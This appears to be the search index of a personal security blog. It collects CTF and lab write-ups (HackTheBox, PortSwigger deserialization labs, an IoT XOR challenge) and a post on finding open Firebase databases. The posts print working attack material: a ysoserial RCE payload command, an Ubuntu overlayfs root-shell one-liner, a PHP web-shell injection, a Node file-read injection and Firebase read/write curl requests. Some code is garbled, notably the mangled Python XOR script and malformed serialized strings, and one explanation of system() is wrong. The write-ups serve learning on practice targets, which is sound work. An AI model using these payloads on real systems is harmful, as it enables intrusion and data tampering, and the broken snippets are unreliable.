{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Welcome to My Cybersecurity Blog","text":"<p>Hi,  I'm Tanish Saxena, A passionate cybersecurity enthusiast. I specialize in Web and Mobile application security, DevSecOps, and Buliding Creative CTF. I enjoy simplifying complex security concepts through write-ups, blog posts, and practical demonstrations.</p> <p>\ud83d\udd17 Connect with me:  </p> <ul> <li>GitHub </li> <li>Medium </li> <li>Hack The Box </li> <li>TryHackMe </li> <li>LinkedIn</li> <li>Discord</li> </ul>"},{"location":"#blogs","title":"\ud83d\udcda Blogs","text":"<p>Explore deep dives, research notes, and fun findings from my bug bounty and reverse engineering adventures.</p> <ul> <li>Insecure Firebase Misconfiguration</li> <li>Exploit Security IOT CTF</li> <li>Introduction to Insecure Deserilaiztion</li> <li>PortSwigger Insecure Deseleraization Part\u00a01</li> <li>PortSwigger Insecure Deseleraization Part\u00a02</li> </ul>"},{"location":"#ctf-writeups","title":"\ud83e\udde0 CTF Writeups","text":"<p>Walkthroughs and solutions to machines and rooms I've rooted.</p>"},{"location":"#hackthebox","title":"\ud83d\udd13 HackTheBox","text":"<ul> <li>Photon Lockdown Writeup</li> <li>The Needle</li> <li>Analytics</li> <li>Behind the Scenes </li> <li>Canvas </li> <li>Cat </li> <li>Debugging Interface </li> <li>Illumination </li> <li>Jscalc </li> <li>LoveTok </li> <li>M0rsarchive </li> <li>RenderQuest </li> <li>RFlag </li> <li>Signals </li> <li>Topology </li> <li>Toxic </li> <li>Weather App</li> </ul>"},{"location":"#tryhackme","title":"\ud83d\udd75\ufe0f TryHackMe","text":"<ul> <li>Bounty-Hunter </li> <li>Brooklyn-Nine-Nine </li> <li>Committed</li> <li>Git-Happens </li> <li>Grep</li> <li>HeartBleed </li> <li>Pickle Rick </li> <li>TakeOver</li> <li>TomGhost</li> </ul>"},{"location":"Blogs/EXPLOIT_SECURITY_IoT_CTF/","title":"EXPLOIT SECURITY For IOT and Embedded-based CTF Platform","text":"<p>EXPLOIT SECURITY For IOT and Embedded-based CTF Platform</p> <p></p> <p>Exploit Security | Penetration Testing | Security ConsultancyExploit Security | Penetration Testing Services | Security Researcherswww.exploitsecurity.io</p> <p></p> <p>Emulate to ExploitateEdit descriptionexploitthis.ctfd.io</p> <p></p> <p>Recently on LinkedIn, I got a DM from Victor Hanna He is also the founder of Exploit Security and CHO, also in Exploit Security offers penetration testing services for Web Application Assessment, Infrastructure Assessment, Wireless Assessment, Embedded Systems Assessment and Mobile Assessment which you check at</p>"},{"location":"Blogs/EXPLOIT_SECURITY_IoT_CTF/#exploitsecurityio","title":"exploitsecurity.io","text":"<p>he has created CTFs mainly for embedded and IoT security which you can check out at. he was found in creating these labs which are amazing and give great knowledge about embedded and IoT security scenarios</p>"},{"location":"Blogs/EXPLOIT_SECURITY_IoT_CTF/#exploitthisctfdio","title":"exploitthis.ctfd.io","text":"<p>Moreover, these CTFs are a great opportunity to learn and practice your embedded and IoT hacking skills/pen-testing skills.</p> <p>As im also learning embedded security and IOT security this was a great opportunity to get to know and work around these types of lab or CTFs because you might not see many of these CTFs out there and that's where this makes this platform exclusive and rare for a enthusiast who want to get into embedded and IOT security</p> <p>Let's check out some labs</p> <p></p> <p>Till date, they have uploaded around 8+ labs and continue to upload more and all of them have their categories from Firmware Emulation, XOR, UART, API etc.</p> <p>let's Do a lab and let me give a small walkthrough i will be doing XOR</p>"},{"location":"Blogs/EXPLOIT_SECURITY_IoT_CTF/#xor","title":"XOR","text":"<p>Start by downloading the required file</p> <p></p> <p>enc_flag</p> <p>checking what type of file we have also using strings to check its content</p> <p></p> <p>It's a data type file</p> <p>Data file formats usually come in two main varieties: Binary files\u200a\u2014\u200afiles that contain information in their binary format, and Text-based files\u200a\u2014\u200acontaining text-based data and information, for documents that are primarily databases. -source google</p> <p>Now that we know what type of file we are dealing with, we can now use a utility such as HEXDUMP to help us ascertain the files nuances.</p> <pre><code>hexdump -C enc_flag\n</code></pre> <p>C: Denotes canonical format i.e. hex+ASCII</p> <p> We notice the hex contains a repeating value i.e. \u2018x\u2019 or \u2018\\x78\u2019, this leads us to infer that this may be our \u2018magic character\u2019 used to XOR the original flag.</p> <p>We can safely infer this as hex \\x00 within the binary, when XOR\u2019d with the \u2018magic character\u2019 will result in the same character \u2018magic character\u2019. Below shows the side by side view of both the XOR\u2019d and non-XOR\u2019d file comparison, noting the \\x00 bytes.</p> <p></p> <p>With this information obtained, we can now look to XOR the enc_flag binary, which should now uncover the plaintext version of the file. There are numerous online utilities that would allow for us to do this, however Exploit Security likes to live of the land, so they suggested utilising python to do this.</p> <pre><code>#!/usr/bin/python3withopen(\"enc_flag\",\"rb\")\nasf:rd=bytearray(f.read())forn,\nvinenmurate(rd):rd[n] = v^ord(\"x\")\nwithopen(decrypted_flag,\"wb\")asg:g.write(rd)\n</code></pre> <p>Now with the deXOR\u2019d file on-hand we can execute it for the win!</p> <pre><code>./decrypted_flag |base64-Ddflag{B{spoiler}s}\n</code></pre> <p>and there we have the flag</p> <p>You can check out the labs and I also hope you try these CTF</p> <p>discord link</p> <p>Join the exploitsecurity.io Discord Server!Check out the exploitsecurity.io community on Discord - hang out with 12 other members and enjoy free voice and text\u2026discord.gg</p> <p></p> <p>Thank you for Reading</p>"},{"location":"Blogs/Introduction-to-Insecure-Deserialization/","title":"Introduction to Insecure Deserialization","text":""},{"location":"Blogs/Introduction-to-Insecure-Deserialization/#introduction","title":"Introduction","text":"<p>Insecure deserialization is when user-controllable data is deserialized by a website.</p> <p></p> <p>In order to understand the vulnerability we first need to understand how this work and what goes into the back end and how the process of serialization and unserialization works.</p> <p>Serialization is the process of converting a data object\u200a\u2014\u200aa combination of code and data represented within a region of data storage\u200a\u2014\u200ainto a series of bytes that saves the state of the object in an easily transmittable form.</p> <p>The process in which the data gets serialize and becomes easy to store is called serialization let\u2019s see an example of serialized data.</p> <pre><code>// some PHP code   \n$User = new username;  \n$User-&gt; Username = 'jack';   \n$User-&gt; status = \"not admin\";\n</code></pre>"},{"location":"Blogs/Introduction-to-Insecure-Deserialization/#the-below-code-is-the-serialized-form-of-the-above-code","title":"The below code is the serialized form of the above\u00a0code","text":"<pre><code>Serialized data  \nO:4:\"User\":2:{s:8\":\"Username\";s:4:jack;s:9:\"not admin\"}\n</code></pre>"},{"location":"Blogs/Introduction-to-Insecure-Deserialization/#insecure-deserialization-is-commonly-found-in-these-languages","title":"Insecure deserialization is commonly found in these languages","text":"<ul> <li>PHP</li> <li>Python</li> <li>Java</li> <li>Ruby</li> </ul>"},{"location":"Blogs/Introduction-to-Insecure-Deserialization/#php-serialization-and-deserialization-process","title":"PHP Serialization and Deserialization Process","text":"<p>Taking the example of php object injection vulnerability which is the same as insecure deserialization.</p> <p>Now in php, there are two functions that are required to be understood.</p> <p>1) serialize()</p> <p>2) unserialize()</p> <p>Lets look into serialize() function.</p> <pre><code>&lt;?  \nclass User{  \n public $username;  \n Public $status;  \n }  \n$User = newuser;  \n$User-&gt; username=\"jack\";  \n$User-&gt; status ='not admin';  \necho serialize($User)   \n?&gt; \n</code></pre> <p><pre><code>serialized form  \nO:4\"User\":2:{s:8\"username\":s:4\"jack\";s:6:\"status\":s:9;\"not admin\";}\n</code></pre> Let\u2019s understand this serialization form better using a bit of reference</p> <pre><code>B: The Boolean   \nI: THE\\_INTEGER  \nd: THE\\_FLOAT   \ns: LENGHT\\_OF\\_STRING:AUTUAL\\_STRING  \na: NUMBER\\_OF\\_ELEMENTS:{ELEMNET}  \nO: LENGHT\\_OF\\_NAME:\"CLASS\\_NAME\":NUMBER\\_OF\\_PROPERTIES:{PROPERTIES}\n</code></pre> <pre><code>O:4\"User\u201d:2:{s:8\"username\u201d:s:4\"jack\u201d;s:6:\u201dstatus\u201d:s:9;\u201dnot admin\u201d;}\n</code></pre> <p></p> <p><pre><code>basically, the total number of alphabets in a word is first put as a number after   \nwriting any reference for example s:6\"sticks\" s is the length of the string  \n\n4 - User | s  \n2 - username, status | O  \n8 - username | s  \n4 - Jack | s  \n6 - status | s  \n9 - not admin ## including the spacing between the words | s \n</code></pre> Now that we understand this, we can change the request where we can change the user status for example.</p> <pre><code>s:6:\u201dstatus\u201d:s:9;{not admin\u201d;}\u200a\u2014\u200a-&gt; s:6:\u201dstatus\u201d:s:9;{\u201cadmin\u201d;}\n</code></pre> <p>Here we changed the status code to admin although this is not exactly the vulnerability the AIM is to get an RCE(Remote Code Execution) via insecure deserialization which is what we are aiming to achieve.</p> <p>For RCE we also need to know functions related to php now these functions may differ from one language to another but for PHP, these functions are called.</p> <ul> <li>_wakeup()</li> <li>_destruct()</li> </ul> <p>wakeup() function is used to establish a connection between the user and the server or reestablish the connection with was lost during serialization.</p> <p><pre><code>Class testdb{  \n private $hook;  \n fucntion\\_construct(){  \n #main function that we need to understand   \n ** $User\\_data = unserialize($COOKIE['data']); **  \n function\\_\\_wakeup(){  \nif (isset($this-&gt;hook)) eval($this-&gt;hook):   \n}}\n</code></pre> Here $User_data = unserialize($COOKIE[\u2018data\u2019]); the function uses the cookie to evaluate the given data or value here which is executed which allows the user to fetch information just using the cookie, here in this code the (hook) function is created and which then later executed using eval function [The <code>eval()</code> method evaluates or executes an argument.].</p> <p>The cookie data which is base64 encoded gets unserialized and gets executed given an example below.</p> <p></p> <p>Therefore we need to manipulate the cookie in order to achieve RCE using insecure deserialization now that we understand that we need to manipulate the cookie data, lets now see with an example how we will manipulate the cookie.</p> <p><pre><code>&lt;?php  \nclass prodtest1  \n{   \n pirvate $hook = \"phpinfo();\";  \n}  \nprint urlencode(serialze)(new prodtest1);  \n?&gt;\n</code></pre> On running the above code we will get.</p> <pre><code>O%3A9%3A%22Prodtest1%22%3A1%3A%7Bs%3A15%3A%22%00Prodtest1%00hook%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D\n</code></pre> <p>Enough of the theory let\u2019s do some lab Part 1 Part 2 I will post the lab walkthrough</p> <p>Thank you for reading</p>"},{"location":"Blogs/PortSwigger-Insecure-Deseleraization-Part-1/","title":"PortSwigger Insecure Deseleraization Part\u00a01","text":"<p>Lab: Modifying serialized objects | Web Security Academy This lab uses a serialization-based session mechanism and is vulnerable to privilege escalation as a result. To solve\u2026portswigger.net</p> <pre><code>Lab:- Modifying serialized objects\nLab type:- APPRENTICE\n</code></pre> <p>This lab uses a serialization-based session mechanism and is vulnerable to privilege escalation as a result. To solve the lab, edit the serialized object in the session cookie to exploit this vulnerability and gain administrative privileges. Then, delete the user<code>carlos</code>.</p> <p>You can log in to your own account using the following credentials: <code>wiener:peter</code></p> <p>Lets Start doing the lab although the lab has solution i also wanted to make a walkthrough about the lab and so i did</p> <p>Let\u2019s start the first login into the Portswigger site and open the first lab Modifying serialized objects also start brupsuite and don\u2019t yet start the intercept tab (Http History) will automatically login the request</p> <p></p> <p>now click on my account page and open it with the given credential</p> <p></p> <p>In the proxy tab click on the HTTP history click on the /my-account request and send it to the repeater tab by clicking the (ctrl + r) key or by right click mouse and send it to the repeater tab</p> <p>now copy the cookie and open the decoder tab and paste the cookie in it and decode it as bas64 you will see the serialized form of the cookie</p> <p></p> <p>Now in the cookie, the b represents a boolean value that is set to 0 which means false, let\u2019s change it to 1 which means true and again encode it as base64, copy the manipulated cookie</p> <p>now start the intercept tab and refresh the page now send the request to the repeater and remove the cookie value and paste the manipulated cookie value and send it</p> <p></p> <p>Now see carefully that you have got an /admin panel link, which means that we have admin-level privileges now change the path of the page to /admin and send the request again and you will see 2 new links /admin/delete?username=weiner and /admin/delete?username=carlos so now again change the path to /admin/delete?username=carlos and send the request again you will see the account will be deleted and the lab will be solved</p> <p></p> <p>I will also post one more labs related to Inscure Deserialization</p> <p>Thank you for reading</p>"},{"location":"Blogs/PortSwigger-Insecure-Deseleraization-Part-2/","title":"PortSwigger Insecure Deseleraization Part\u00a02","text":"<p>Lab: Exploiting Java deserialization with Apache Commons | Web Security Academy This lab uses a serialization-based session mechanism and loads the Apache Commons Collections library. Although you\u2026portswigger.net</p> <pre><code>Lab:- Exploiting Java with Apache Commons \nLab type:- PRACTITIONER\n</code></pre> <p>This lab uses a serialization-based session mechanism and loads the Apache Commons Collections library. Although you don\u2019t have source code access, you can still exploit this lab using pre-built gadget chains.</p> <p>To solve the lab, use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the <code>morale.txt</code> file from Carlos's home directory.</p> <p>You can log in to your own account using the following credentials: <code>wiener:peter</code>.</p> <p>This lab will be a little different and uses a tool called Ysoserial, we will install the tool first and see how to use it along with errors you might encounter while using the tool, also installing appropriate dependencies for it to work perfectly</p> <p>Also, note that Java 8 is not found in the kali linux repo so you will have to install it manually using the given method</p> <p>First Install java8, you might get confused about which particular version to use so I have included the download link for it, you might have to signup for into Oracle site in order to download</p> <p>Java Archive Downloads\u200a\u2014\u200aJava SE 8u211 and later</p> <p>Into the terminal, you can check which version of Java you are currently using</p> <p><pre><code>java --version\n</code></pre> now cd into</p> <p><pre><code>cd /usr/lib/jvm\n</code></pre> if there is no package of Java installed in your system you can manually create this directory</p> <p>now in the /usr/lib/jvm unzip the downloaded package of java8</p> <p><pre><code>sudo tar -xvzf /home/logic/jdk-8u371-linux-x64.tar.gz\n</code></pre> now cd into jdk1.8.0_371/ and check the full path of the directory which should be something like this</p> <p><pre><code>/usr/lib/jvm/jdk1.8.0\\_371\n</code></pre> now using any text editor you have to edit the /etc/environment file i am using vi here</p> <p><pre><code>sudo vi /etc/environment\n</code></pre> and add the following path</p> <p><pre><code>/usr/lib/jvm/jdk1.8.0\\_371/bin:usr/lib/jvm/jdk1.8.0\\_371/db/bin:usr/lib/jvm/jdk1.8.0\\_371/jre/bin\n</code></pre> Run the following command one by one</p> <pre><code>sudo update-alternatives - install \"/usr/bin/java\" \"java\" \"/usr/lib/jvm/jdk1.8.0\\_371/bin/java\" 0\n</code></pre> <pre><code>sudo update-alternatives - install \"/usr/bin/java\" \"java\" \"/usr/lib/jvm/jdk1.8.0\\_371/bin/javac\" 0\n</code></pre> <pre><code>sudo update-alternatives - set java /usr/lib/jvm/jdk1.8.0\\_371/bin/javasudo update-alternatives - set java /usr/lib/jvm/jdk1.8.0\\_371/bin/java\n</code></pre> <pre><code>sudo update-alternatives - set java /usr/lib/jvm/jdk1.8.0\\_371/bin/javac\n</code></pre> <pre><code>sudo update-alternatives - config java\n</code></pre> <pre><code>java -version\n</code></pre> <p></p> <p>It should be set to java8 if you used the command above and you can choose between java17 and java8 in my case, you might be having different versions but you should set it to java8 and java8c</p> <p>now install Ysoserial using the given link:-</p> <p>https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar</p> <p>Now we are good to go let\u2019s start the lab</p> <p></p> <p>after the lab starts open burp suite along with it and go to the login page and log in with the given credentials weiner:peter</p> <p></p> <p>now open the burp suite proxy tab and in HTTP History</p> <p></p> <p>now using ysoserial tool we will generate a payload</p> <p></p> <p><pre><code>java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base  \n64\n</code></pre> now turn on the intercept tab and click on the home tab and send that request to the repeater tab</p> <p></p> <p>now copy the cookie generated by ysoserial tool and replace it with the cookie in the repeater tab</p> <p>also, encode the cookie with URL encoding</p> <p>and there you go the lab is solved</p> <p></p> <p>Thanks for reading</p>"},{"location":"Blogs/insecure_firebase_blog/","title":"How I Found 2 Insecure Firebase Databases","text":"<p>A few weeks back, I was doing some bounty hunting on Android apps when I came across two mobile applications vulnerable to Firebase enumeration.</p>"},{"location":"Blogs/insecure_firebase_blog/#what-is-firebase","title":"What is Firebase?","text":"<p>Firebase is a backend development platform by Google. Due to insecure configurations, it\u2019s sometimes possible to enumerate resources without proper authorization and access unsafe data.</p> <p>These misconfigurations are commonly found in Android apps. Although the chances of finding one might seem low, once you start actively looking, there's a decent chance you'll spot one.</p> <p>\ud83d\udca1 Even though I didn\u2019t receive a bounty for this vulnerability (despite HackerOne reports rating similar issues as severity 9\u201310), both companies I reported to were major Indian brands listed on bug bounty platforms\u2014and still didn\u2019t even offer a Hall of Fame mention.  </p> <p>I felt\u2026 betrayed \ud83d\ude05    </p> <p></p>"},{"location":"Blogs/insecure_firebase_blog/#why-this-blog","title":"Why This Blog?","text":"<p>I wanted to write this post because it was surprisingly easy to find. Once you automate most of the process, spotting an insecure Firebase instance becomes a piece of cake\u2014especially if you're checking 20\u201330 apps.</p> <p>Choose any Android app that is listed in any bug bounty platform  or is open For a vulnerability discloser program and then you can go ahead and Perform the following steps</p>"},{"location":"Blogs/insecure_firebase_blog/#the-process","title":"The Process","text":""},{"location":"Blogs/insecure_firebase_blog/#1-choose-a-target-app","title":"1. Choose a Target App","text":"<p>Pick any Android app that is:</p> <ul> <li>Listed on a bug bounty platform, or</li> <li>Open for a vulnerability disclosure program</li> </ul>"},{"location":"Blogs/insecure_firebase_blog/#2-get-the-apk-file","title":"2. Get the APK File","text":"<p>You\u2019ll need the APK file. You can use:</p> <ul> <li>Genymotion Emulator: https://www.genymotion.com/</li> <li>APKPure: https://apkpure.net (Note: APKs may be outdated)</li> </ul> <p>If you're using an emulator like Genymotion:</p> <ol> <li>Set up the emulator.</li> <li>Install the target APK.</li> <li>Proceed to pull the APK file.</li> </ol>"},{"location":"Blogs/insecure_firebase_blog/#3-pull-the-apk-using-adb","title":"3. Pull the APK Using ADB","text":"<p>Tool: Android Debug Bridge (ADB)</p> <p>Run the following command:</p> <pre><code>adb shell pm list packages -f | grep &lt;APK name&gt;\n</code></pre> <p>You\u2019ll get the APK's full path (ignore <code>package:</code> prefix).  </p> <p></p> <p>Now pull the APK:</p> <pre><code>adb pull &lt;path_to_the_APK_file_till_base.apk&gt;\n</code></pre> <p>\u2705 You now have the APK file.</p>"},{"location":"Blogs/insecure_firebase_blog/#4-decompile-the-apk","title":"4. Decompile the APK","text":"<p>Use Apktool to decompile:</p> <pre><code>apktool d base.apk\n</code></pre> <p>A new folder will be created with all the APK contents. Look inside the <code>/res</code> directory.</p>"},{"location":"Blogs/insecure_firebase_blog/#5-find-the-firebase-url","title":"5. Find the Firebase URL","text":"<p>Search inside <code>strings.xml</code>:</p> <pre><code>cat res/values/strings.xml | grep firebase\n</code></pre> <p>You should see a Firebase URL that looks like:</p> <pre><code>https://&lt;project-id&gt;.firebaseio.com\n</code></pre> <p></p>"},{"location":"Blogs/insecure_firebase_blog/#6-check-for-vulnerability","title":"6. Check for Vulnerability","text":"<p>Append <code>/.json</code> to the Firebase URL:</p> <pre><code>curl -X GET https://somefirebase-database.firebaseio.com/.json\n</code></pre> <ul> <li>If it returns data or <code>null</code>, it\u2019s vulnerable \u2705</li> <li>If it returns \u201cPermission denied\u201d, it\u2019s safe \u274c</li> </ul> <p></p>"},{"location":"Blogs/insecure_firebase_blog/#7-exploit-the-firebase-db","title":"7. Exploit the Firebase DB","text":"<p>Let\u2019s try adding data via a POST request:</p> <pre><code>curl -X POST https://somefirebase-database.firebaseio.com/testing1.json \\\n-d '{\"cat\": \"meow\", \"dog\": \"bowbow\"}'\n</code></pre> <p>Now visit:</p> <pre><code>https://somefirebase-database.firebaseio.com/testing1.json\n</code></pre> <p>You should see something like:</p> <pre><code>{\n  \"cat\": \"meow\",\n  \"dog\": \"bowbow\"\n}\n</code></pre> <p></p> <p></p> <pre><code>                                Thank me later \ud83d\ude06\n</code></pre>"},{"location":"Blogs/insecure_firebase_blog/#final-thoughts","title":"Final Thoughts","text":"<p>I hope this post helped you understand how to find Insecure Firebase Enums.</p> <p>If you\u2019re interested, check out more articles/blogs related to Firebase misconfigurations and Android app security.</p> <p>Happy Hunting! \ud83c\udfaf</p> <p>GCP - Firebase Enum</p> <p>Firebase Database Takover</p> <p>Exploiting Insecure Firebase Database!</p> <p>X (Formerly Twitter) disclosed on HackerOne: Periscope-all Firebase</p>"},{"location":"CTF/HackTheBox-Analytics/","title":"HackTheBox Analytics","text":"<p>I started the machine got the IP and did a Nmap scan, port 22(ssh) and port 80(http) were open</p> <pre><code>\u276f sudo nmap -Pn -sT -sV 10.10.11.233  \nStarting Nmap 7.94 ( https://nmap.org ) at 2023-10-17 13:45 IST  \nNmap scan report for 10.10.11.233  \n</code></pre> <p>So I opened Firefox and put in the IP and got (analytical.htb) I added it to /etc/hosts</p> <p></p> <p>So I opened Firefox and put in the IP and got (analytical.htb)</p> <p></p> <p>Looked into the source page and found another link [http://data.analytical.htb] again added it to /etc/hosts.</p> <p></p> <p>Got a Metabase sign-in page I tried logging in with a few different usernames and passwords but it failed so I looked at Google for clues and found out that there is an RCE present in Metabase and found info about the CVE-2023\u201338646.\u00a0 Reference:- https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/</p> <p>Now according to the POC, we have to retrieve the endpoint token so we have an endpoint data.analytical.htb let\u2019s capture the request in the burp suite.</p> <p></p> <p>Found the set-up token now I have to look for an exploit honestly I tried 2\u20133 Exploits including Metasploit which also has the exploit for Metabase so finally found one that works for me.</p> <p>https://github.com/m3m0o/metabase-pre-auth-rce-poc</p> <p>And got a shell.</p> <p></p> <p>Now as I searched around in the machine I found there is already a linpeas script in the /home/Metabase folder, so at the time I was playing the CTF there were 181 more people that were also playing with me someone must have put it there and made it easy for me too lol\u2026\u2026 I used the script and found the password for a user metanalytics and i used to ssh into the machine.</p> <p></p> <p>I got the user flag but now I had to escalate the privilege to get the root flag. did the most basic thing check the OS version and if there are any vulnerabilities related to it got to know that it was running ubuntu 22.04.</p> <p></p> <p>So did the Google dorking for the os version if any thing is there and obviously found a few 2 CVE and few more things. Also found this code to escalate privilege.</p> <pre><code>unshare -rm sh -c \"mkdir 1 u w m &amp;&amp; cp /u*/b*/p*3 1/; setcap cap\\_setuid+eip 1/python3;mount -t overlay overlay -o rw,lowerdir=1,upperdir=u,workdir=w, m &amp;&amp; touch m/*;\" &amp;&amp; u/python3 -c 'import pty; import os;os.setuid(0); pty.spawn(\"/bin/bash\")' \n</code></pre> <p>And boom we got the root shell.</p> <p></p> <p>Thank you for reading</p>"},{"location":"CTF/HackTheBox-Behind-the-Scenes/","title":"HackTheBox Behind the Scenes","text":"<pre><code>HTB-Challenges:- Reversing \nChallenge Info:- Reverse Engineering\nChallenge Level:- Very Easy\n</code></pre> <p>Im continueing to post Reverse engineering content bcoz im trying to dig deep into it and im first trying to get better at basics and these lab are easy but still a part of learning process let\u2019s continue doing the lab.</p> <p>Downloaded the file and unzipped it.</p> <p>And there were 6 files.</p> <p></p> <p>Checked the behindthe scenes file.</p> <p></p> <p>And it found to be a ELF 64-bit file which is baisclly a executable linux file, I checked it\u2019s content using strings.</p> <p></p> <p>Now to analysing this file im using IDA64, Opened and started looking into the file contents.</p> <p></p> <p>In hex view-1 i found something it looked werid.</p> <p></p> <p>If you can observe it, this is formaing the flag itz._\u00a0\u2026\u2026</p> <p>So i copy it and basiclly the flag is written in a reverse order plus there a bit of tempereing that need\u2019s to be done(remove the fullstops) and you will be clearly able to see the flag.</p> <p>and done</p> <p>Thank you for reading.</p>"},{"location":"CTF/HackTheBox-Canvas/","title":"HackTheBox Canvas","text":"<pre><code>HTB-Challenges:- Mics  \nChallenge Info:- Mics encryption based  \nChallenge level:- Easy\n</code></pre> <p>The lab is simple and doesn't require much efforts but i did the lab it is becoz you can earn points so i did the lab.</p> <p>downloaded the zip file and unzipped.</p> <p>there were 4 files.</p> <p></p> <p>I opend index.html but found nothing.</p> <p>Just a simple login page when i enter admin:admin it gave a mock flag.</p> <p></p> <p></p> <p>I looked around and in /js found login.js and opend it.</p> <p></p> <p>So if you didn\u2019t get it yet we need to Obfuscate js.</p> <p></p> <p></p> <p>Now analyzing javascript code we understond how the code work also found it stores the result in ASCII.</p> <p>now we just need to decode ASCII code to get to the flag.</p> <p></p> <p></p> <p>Thank you for reading</p>"},{"location":"CTF/HackTheBox-Cat/","title":"HackTheBox Cat","text":"<pre><code>HTB-Challenges:- Mobile\nChallenge Info:- Mobile based \nchallenge\u00a0Challenge level:- easy\n</code></pre> <p>I started by downloading the necessary files Cat.zip file unzipped it and found a cat\u00a0.ab file\u00a0now\u00a0.ab files are Android Backup files\u00a0use the following command to extract the content of the\u00a0.ab file</p> <pre><code>( printf \"\\x1f\\x8b\\x08\\x00\\x00\\x00\\x00\\x00\" ; tail -c +25 cat.ab )\n</code></pre> <p>And found the following files inside.</p> <p></p> <p>So I opened and searched through the apps folder and did not find anything in it.</p> <p></p> <p>Then moved to another folder (shared) and there are 4 folders 3 of them were empty\u00a0and one folder named Pictures Containers 6 Photos.</p> <p></p> <p>I opened each image but clearly, IMAG0004.jpg looked suspicious so I opened it.</p> <p></p> <p>Bottom of the top secret page.</p> <p>Thank you for reading</p>"},{"location":"CTF/HackTheBox-Debugging-Interface/","title":"HackTheBox Debugging Interface","text":"<pre><code>Challenge type:- Hardware\nChallenge Info:- Embedded device Transmitted data decoding\nChallenge level:- Easy\n</code></pre> <p>First of all, this is the first time I\u2019m engaging in hardware hacking or anything related to hardware hacking\u00a0this was hard for me to figure things out but I learned a lot about logic analysis and in general, i got introduced to hardware hacking.</p> <p>let\u2019s start by Downloading the files and unzipping them.</p> <p>So as I unzipped the\u00a0.zip file I found one file debugging_interface_singal.sal.</p> <p>Again I looked on the internet about the file and it can be easily unzipped using the unzip command.</p> <p>So I did and got 2 more files.</p> <p></p> <pre><code>meta.json and digital-0.bin\n</code></pre> <p>Again I looked at the internet for these (.bin) files in hardware and found out that\u00a0I have to use a logic analyser to analyse this file and again i looked at internet to undestand what is this file and how basic analysis is done and finally got 2\u20133 tool but I used the SALEAE Logic Analyzer.</p> <p>https://www.saleae.com/downloads/</p> <p>https://www.saleae.com/downloads/</p> <p>To analyse it also i had to look a lot into the documentation to understand and analyse every step was different and difficult to understand but i managed to get it.</p> <p></p> <p>I opened the\u00a0.sal file and by using + magnify in and analyze.</p> <p>Now I analyzed the the patterns of the wave signal and found out that there is a repetitionin between-the-lines waves and it was different.</p> <p></p> <p>And in async serial changed the bit rate(Bits/s) to 31230.</p> <p></p> <p>And put data to command line.</p> <p></p> <p>And there we go the flag.</p> <p>Thank you for reading</p>"},{"location":"CTF/HackTheBox-Illumination/","title":"HackTheBox Illumination","text":"<pre><code>HTB-Challenges:- Forensics  \nChallenge Info:- Forensics (Git)  \nChallenge level:- Easy\n</code></pre> <p>Downloaded the file and unzipped it.</p> <p></p> <p>And there were 3 files\u00a0.git, bot.js and config.json I looked into the\u00a0.git file and found a few more files.</p> <p></p> <p>Looked into the logs files and used git command to look into the logs.</p> <p><pre><code>git logs\n</code></pre> </p> <p>See carefully that author has removed a unique token lets look into this.</p> <p><pre><code>git show 47241a47f62ada864ec74bd6dedc4d33f4374699\n</code></pre> </p> <p>Now there is a token and a username both looks like a base64 encoding so\u00a0 lets decode them first lets try with the username.</p> <p></p> <p>And nothing now again i tried with token</p> <p></p> <p>And got the flag</p> <p>Thank you for reading</p>"},{"location":"CTF/HackTheBox-Jscalc/","title":"HackTheBox Jscalc","text":"<pre><code>HTB-Challenges- Web\nChallenge Info:- Web based challenge\u00a0\nChallenge level:- Easy\n</code></pre> <p>CHALLENGE DESCRIPTION</p> <pre><code>In the mysterious depths of the digital sea, a specialized JavaScript \ncalculator has been crafted by tech-savvy squids. With multiple arms \nand complex problem-solving skills, these cephalopod engineers use it \nfor everything from inkjet trajectory calculations to deep-sea math. \nAttempt to outsmart it at your own risk! \ud83e\udd91\n</code></pre> <p>Downloaded the file and unziped them.</p> <p> On visiting on the given ip and port this web page opened.</p> <p> I opened burp and captured the request.</p> <p> So it uses some {\u201cformula\u201d:\u201d \u201d} and send the value for final sum we can use.</p> <pre><code>{\"formula\":\"require('fs').readFileSync('/flag.txt').toString();\"}\n</code></pre> <p>now lets try caputering the request again and send it to repeater.</p> <p>and we got the flag.</p> <p> Thank you for reading.</p>"},{"location":"CTF/HackTheBox-LoveTok/","title":"HackTheBox LoveTok","text":"<p> <pre><code>HTB-Challenges:- Web\u00a0  \nChallenge Info:- Web-Application-based challenge\u00a0  \nChallenge level:- Easy\n</code></pre></p> <p>Started off by downloading the files and starting the machine as soon as the machine started.\u00a0 there was an IP followed by a port so it was obvious that that was the only port which is open.\u00a0 I didn\u2019t perform any Nmap scan.</p> <p>again </p> <p> there was a flag which is a test flag if you see this don\u2019t get excited.</p> <p> So I opened the web page there was this fancy page and a Big GIF.</p> <p> Now I also did a directory brute force bcoz I miss things easily but found nothing but on clicking.\u00a0 try again! another link opened up with a parameter.</p> <p><pre><code>http://142.93.32.153:30559/?format=r\n</code></pre> I tried Linux commands ls and cat to check what happened and as a result, some text was changing</p> <p> Now I had to look for some way to execute the command so I thought to look into the files downloaded and in a file router.php and found that when we input some text we will be prompted to error.\u00a0 what we need here is a web shell so I looked at Google for some payloads and eventually found one that was made for the lab I guess lol.</p> <p><pre><code>${system($\\_GET[cmd])}&amp;cmd=ls /\n</code></pre> now let\u2019s understand how this payload works.</p> <p><code>system:- The **system. functions** object allows you to call a particular Service Manager RAD function from JavaScript.   and GET is an HTTP request\u00a0   cmd is used to call the command\u00a0   &amp; is used to add another command or object in the parameter   cmd=ls is basically we used cmd to store ls\u00a0   this whole works as our payload</code></p> <p> This payload works we can see flagmVbY8.</p> <p> And there we go we got the flag I used cat /flagmVbY8</p> <p>Thank you for reading</p>"},{"location":"CTF/HackTheBox-M0rsarchive/","title":"HackTheBox M0rsarchive","text":"<pre><code>HTB-Challenges:- Mics  \nChallenge Info:- Mics cipher based  \nChallenge level:- Easy\n</code></pre> <p>This is one of the easiest challenges but the use of automation is shown well in this\u00a0and how automation helps very effectively in CTF or Bug bounty hunting or any place it can be used.</p> <p>In this case, the Challenge description mentions unzipping the archive several times.</p> <p>But here I started digging in manually after I unzipped 2\u20133 files I realised that I\u2019m currently at file 997 